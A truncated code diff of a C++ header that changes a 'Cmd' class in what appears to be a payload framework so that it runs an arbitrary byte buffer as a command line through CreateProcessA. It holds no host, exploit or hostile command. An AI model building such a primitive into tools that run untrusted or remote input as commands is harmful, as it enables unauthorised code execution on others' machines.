@@ -1,19 +1,19 @@
 #pragma once
 #include "payload.h"
 
-namespace Reader {
+namespace Payloads {
     class Cmd : public Payload {
     public:
         using Payload::Payload;
 
-        void Run() {
+        void Run(uint8_t* p, int n) {
             STARTUPINFOA si;
             ZeroMemory(&si, sizeof(STARTUPINFOA));
             PROCESS_INFORMATION pi;
 
             CreateProcessA(
                 NULL,
-                payload,
+                (LPSTR)p,
                 NULL,
                 NULL,
                 FALSE,
